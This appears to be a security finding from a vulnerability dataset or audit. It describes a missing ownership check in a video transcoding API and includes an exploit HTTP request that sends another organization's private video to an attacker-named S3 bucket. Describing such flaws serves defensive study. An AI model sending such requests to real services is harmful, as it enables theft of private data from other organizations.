diagnosis: The ExecuteTask worker method retrieves the source video file using VideoID without confirming that SubmittedByOrgID is the actual owner of VideoID. An attacker can enqueue transcode tasks referencing proprietary or unlisted video IDs from other organizations and specify their own S3 bucket as DestinationS3, exfiltrating raw private video assets.
exploit_request:
POST /api/videos/batch-transcode HTTP/1.1
Host: video-cloud.media-infra.io
Authorization: Bearer org_token_attacker
Content-Type: application/json

{"video_id": "vid_private_raw_884", "target_resolution": "1080p", "dest_bucket": "s3://attacker-open-bucket/stolen/"}
